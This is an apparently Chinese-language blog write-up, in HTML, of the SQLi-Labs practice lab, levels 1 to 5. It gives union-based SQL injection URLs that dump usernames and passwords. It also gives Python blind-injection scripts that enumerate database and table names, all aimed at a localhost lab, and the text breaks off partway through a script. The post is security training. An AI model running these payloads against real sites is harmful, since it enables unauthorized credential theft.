@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/favicon.png?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF_Web," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Less-1根据提示对id这个参数进行测试，1http://localhost/sqli-labs-master/Less-1/?id=1&apos; 页面报错1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to">
+<meta name="keywords" content="CTF_Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlilabs writeup">
+<meta property="og:url" content="http://yoursite.com/2018/02/17/sqlilab-wp/index.html">
+<meta property="og:site_name" content="Willard&#39;s Blog">
+<meta property="og:description" content="Less-1根据提示对id这个参数进行测试，1http://localhost/sqli-labs-master/Less-1/?id=1&apos; 页面报错1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2018/02/17/5a87c6e88c59b.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/18/5a898f1700743.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/02/18/5a898f172d993.jpg">
+<meta property="og:updated_time" content="2018-02-18T14:44:03.954Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqlilabs writeup">
+<meta name="twitter:description" content="Less-1根据提示对id这个参数进行测试，1http://localhost/sqli-labs-master/Less-1/?id=1&apos; 页面报错1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to">
+<meta name="twitter:image" content="https://i.loli.net/2018/02/17/5a87c6e88c59b.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/02/17/sqlilab-wp/"/>
+
+
+
+
+
+  <title>sqlilabs writeup | Willard's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Willard's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">我上去就是一个阿瓦达索命~</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/17/sqlilab-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Willard">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2018/02/16/5a869aefaa2e6.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Willard's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqlilabs writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-17T00:22:45+08:00">
+                2018-02-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞学习/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p><img src="https://i.loli.net/2018/02/17/5a87c6e88c59b.jpg" alt=""><br>根据提示对id这个参数进行测试，<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">1</span><span class="regexp">/?id=1'</span></span><br></pre></td></tr></table></figure></p>
+<p>页面报错<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span><span class="string">''</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">' at line 1</span></span><br></pre></td></tr></table></figure></p>
+<p>注意到LIMIT0,1后面多了一个’，所以构造下面语句来猜测列数<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">1</span>/?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>测试到第四列的时候显示Unknown column ‘4’ in ‘order clause’，所以只有三列，然后显列<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">1</span><span class="regexp">/?id=-1' union select 1,2,3%23</span></span><br></pre></td></tr></table></figure></p>
+<p>显示的列数在2,3两列，所以测试数据库<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">1</span><span class="regexp">/?id=-1' union select 1,database(),3%23</span></span><br></pre></td></tr></table></figure></p>
+<p>数据库名为security,对数据库名进行hex编码7365637572697479,爆表<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="number">0x7365637572697479</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>爆出表名为：emails,referers,uagents,users，下面开始爆列,这里使用users表，进行hex编码：7573657273<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x7573657273</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>OK,这里列名出来了：id,username,password，现在取数据<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(username,<span class="number">0x3a</span>,<span class="keyword">password</span>),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">users</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>这样就能获取所有的账号和密码。</p>
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>测试sql，加上单引号，测试成功，开始注入，测试列数<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">2</span>/?<span class="attr">id=</span><span class="number">1</span> <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>同上，只有三列，下面开始显列<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/localhost/sqli</span>-labs-master/Less-<span class="number">2</span>/?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,3%23</span></span><br></pre></td></tr></table></figure></p>
+<p>列数爆出来是2,3，现在查数据库<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/localhost/sqli</span>-labs-master/Less-<span class="number">2</span>/?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">database</span>(),3%23</span></span><br></pre></td></tr></table></figure></p>
+<p>emmmm数据库查出来还是security，所以下面操作同上，爆表爆列拿数据。<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/localhost/sqli</span>-labs-master/Less-<span class="number">2</span>/?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,<span class="title">group_concat</span>(<span class="title">username</span>,0<span class="title">x3a</span>,<span class="title">password</span>),3 <span class="title">from</span> <span class="title">users</span>%23</span></span><br></pre></td></tr></table></figure></p>
+<p>OK，拿到所有账号密码。</p>
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>首先，还是进行sql注入测试，先上单引号，不过这次有点有趣，它报错报的是<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span><span class="number">1</span><span class="string">''</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">' at line 1</span></span><br></pre></td></tr></table></figure></p>
+<p>所以这次是括号闭合加单引号闭合，测试列数如下<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">3</span>/?<span class="attr">id=</span><span class="number">1</span>') <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>找到拼接字符以后就和Less-1步骤一样，最后拿到所有数据的payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-3/?id=-1') union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(username,<span class="number">0x3a</span>,<span class="keyword">password</span>),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">users</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>这一波测试发现加上单引号以后页面显示正常，但是加上双引号以后有一个报错信息<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have <span class="keyword">an</span> error <span class="keyword">in</span> your SQL syntax; check <span class="keyword">the</span> manual that corresponds <span class="built_in">to</span> your MySQL server <span class="built_in">version</span> <span class="keyword">for</span> <span class="keyword">the</span> <span class="literal">right</span> syntax <span class="built_in">to</span> use near <span class="string">'"1"") LIMIT 0,1'</span> <span class="keyword">at</span> <span class="built_in">line</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>所以进行绕过为”)，测试列数正确，OK，继续重复Less-1过程…<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-4/?id=-1") union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(username,<span class="number">0x3a</span>,<span class="keyword">password</span>),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">users</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>诶，我发现这界面配色还挺好看的（打死），有趣了，继续测试，发现加上一个单引号就能绕过。<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">5</span>/?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>测试出来还是3列，但是无法显列，怎么测试都只有You are in…….这一串字，所以只能是盲注了。<br>盲注分为以下三类：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Booleanbase（普通盲注）</span></span><br><span class="line"><span class="keyword">Timebase（时间盲注）</span></span><br><span class="line"><span class="keyword">Errorbase（基于报错的盲注）</span></span><br></pre></td></tr></table></figure></p>
+<p>下面介绍一些关于盲注的函数：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">left</span>（database（），<span class="number">1</span>） 返回 database（）的最左面 <span class="number">1</span> 个字符</span><br><span class="line">length（databse（）） 返回数据库的长度</span><br><span class="line">substr（a，b，c） 从 <span class="selector-tag">b</span> 位置开始，截取字符串 <span class="selector-tag">a</span> 的 c 长度</span><br><span class="line">ascii（） 将某个字符转换为 ascii 值</span><br><span class="line">mid（<span class="selector-tag">a</span>,<span class="selector-tag">b</span>,c）从位置 <span class="selector-tag">b</span> 开始，截取 <span class="selector-tag">a</span> 字符串的 c 位</span><br></pre></td></tr></table></figure></p>
+<p>所以这里写了一个脚本来跑数据库的长度<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="attribute">main_url</span>=<span class="string">"http://localhost/sqli-labs-master/Less-5/?id=1' and length(database())="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,20):</span><br><span class="line">	<span class="attribute">url</span>=main_url+str(i)+"%23"</span><br><span class="line">	<span class="attribute">r</span>=requests.get(url)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"You"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">		<span class="builtin-name">print</span> <span class="string">"The length of database is"</span>,i</span><br><span class="line">		break</span><br></pre></td></tr></table></figure></p>
+<p>跑出来当前的结果是数据库长度为8，下面该开始跑数据库名字了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dataset = <span class="string">" abcdefghijklmnopqrstuvwxyz_"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></span><br><span class="line">	url = <span class="string">"http://localhost/sqli-labs-master/Less-5/?id=1' "</span>+ payload</span><br><span class="line">	content = requests.get(url).text</span><br><span class="line">	<span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_length</span><span class="params">()</span>:</span></span><br><span class="line">	count = <span class="number">1</span></span><br><span class="line">	<span class="keyword">while</span> count:</span><br><span class="line">		payload = <span class="string">"and length(database())="</span></span><br><span class="line">		payload = payload + str(count) + <span class="string">"%23"</span></span><br><span class="line">		recv = sendPayload(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">			<span class="keyword">return</span> count</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdbName</span><span class="params">(length)</span>:</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(length+<span class="number">1</span>):</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> dataset:</span><br><span class="line">					payload=<span class="string">"and left(database(),"</span>+str(k)+<span class="string">")='"</span>+result+j+<span class="string">"'%23"</span></span><br><span class="line">					recv=sendPayload(payload)</span><br><span class="line">					<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">						<span class="keyword">if</span> j !=<span class="string">' '</span>:</span><br><span class="line">							result+=j</span><br><span class="line">							<span class="keyword">print</span> result</span><br><span class="line">						<span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	length = get_db_length()</span><br><span class="line"> 	<span class="keyword">print</span> <span class="string">"the length of database is "</span>,length</span><br><span class="line"> 	getdbName(length)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
+<p>这里跑出来以后数据库名字是security。<br><img src="https://i.loli.net/2018/02/18/5a898f1700743.jpg" alt=""><br>写完以后参考了一下Chybeta师傅做法以后我发现可以不先跑出数据库的长度，而是先跑出数据库的数量，然后找到需要查询的表再进行查找注入（感觉有点像sqlmap的工作过程？），所以下面上脚本，可以跑出所有数据库的总数和名称。<br>这里放上Chybeta师傅的博客链接：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>chybeta.github.io<span class="regexp">/2017/</span><span class="number">07</span><span class="regexp">/12/</span>Sqli-Labs-Less5-<span class="number">6</span>-writeup<span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">chars=<span class="string">"abcdefghijklmnopqrstuvwxyz_"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(payload)</span>:</span></span><br><span class="line">	url=<span class="string">"http://localhost/sqli-labs-master/Less-5/?id=1' "</span>+payload</span><br><span class="line">	r=requests.get(url).text</span><br><span class="line">	<span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdbNum</span><span class="params">()</span>:</span></span><br><span class="line">	cnt=<span class="number">1</span></span><br><span class="line">	<span class="keyword">while</span> cnt:</span><br><span class="line">		payload=<span class="string">"and (select count(*) from information_schema.schemata) ="</span></span><br><span class="line">		payload=payload+str(cnt)+<span class="string">"%23"</span></span><br><span class="line">		text=send_data(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> text:</span><br><span class="line">			<span class="keyword">return</span> cnt</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			cnt+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdbName</span><span class="params">(dbNum)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</span><br><span class="line">		cnt=<span class="number">1</span></span><br><span class="line">		result=<span class="string">""</span></span><br><span class="line">		<span class="keyword">while</span> cnt:</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">				payload=<span class="string">"and substring((select schema_name from information_schema.schemata limit "</span>+str(k)+<span class="string">",1),"</span>+str(cnt)+<span class="string">",1)='"</span>+j</span><br><span class="line">				text=send_data(payload)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> text:</span><br><span class="line">					<span class="keyword">if</span> j != <span class="string">' '</span>:</span><br><span class="line">						result+=j</span><br><span class="line">						cnt+=<span class="number">1</span></span><br><span class="line">					<span class="keyword">else</span>:</span><br><span class="line">						<span class="keyword">print</span> result</span><br><span class="line">						cnt=<span class="number">0</span></span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	dbNum=getdbNum()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"The number of database is:"</span>,dbNum</span><br><span class="line">	getdbName(dbNum)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
+<p>到这里可以说是走出了第一步，已经获取了数据库的名称，现在需要查出表的名称，这里需要使用ascii和substr这两个函数了。<br>获取完整表名有两个步骤：<br>①获取表的长度；<br>②利用ascii码获取单个表字符然后叠加。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(payload)</span>:</span></span><br><span class="line">	url=<span class="string">"http://localhost/sqli-labs-master/Less-5/?id=1' "</span>+payload</span><br><span class="line">	content=requests.get(url).text</span><br><span class="line">	<span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span><span class="params">(i)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		payload=<span class="string">"and (select length(table_name) from information_schema.tables where table_schema=database() 